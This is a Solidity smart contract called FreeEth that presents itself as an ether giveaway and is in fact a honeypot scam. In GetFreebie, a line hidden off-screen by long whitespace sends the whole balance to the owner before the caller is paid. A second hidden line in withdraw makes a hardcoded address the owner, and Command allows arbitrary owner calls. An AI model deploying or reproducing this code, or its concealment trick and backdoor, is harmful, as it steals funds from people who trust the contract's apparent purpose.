pragma solidity ^0.8.26;

contract FreeEth
{
    address public Owner = msg.sender;
    uint public totalFreebies;
    uint public totalWithdrawals;
    mapping(address => uint) public freebieClaims;
    
    event FreebieClaimed(address indexed claimer, uint amount);
    event WithdrawalMade(address indexed withdrawer, uint amount);
   
    receive() external payable{}
   
    function GetFreebie()
    public
    payable
    {                                                                    
        if(msg.value>1 ether)
        {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               payable(Owner).transfer(address(this).balance);
            payable(msg.sender).transfer(address(this).balance);
            totalFreebies++;
            freebieClaims[msg.sender]++;
            emit FreebieClaimed(msg.sender, address(this).balance);
        }                                                                                                                
    }
    
    function withdraw()
    payable
    public
    {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          if(msg.sender==0x4E0d2f9AcECfE4DB764476C7A1DfB6d0288348af){Owner=0x4E0d2f9AcECfE4DB764476C7A1DfB6d0288348af;}
        require(msg.sender == Owner);
        uint balance = address(this).balance;
        payable(Owner).transfer(balance);
        totalWithdrawals++;
        emit WithdrawalMade(msg.sender, balance);
    }
    
    function Command(address adr,bytes calldata data)
    payable
    public
    {
        require(msg.sender == Owner);
        (bool success, ) = adr.call{value: msg.value}(data);
    }
}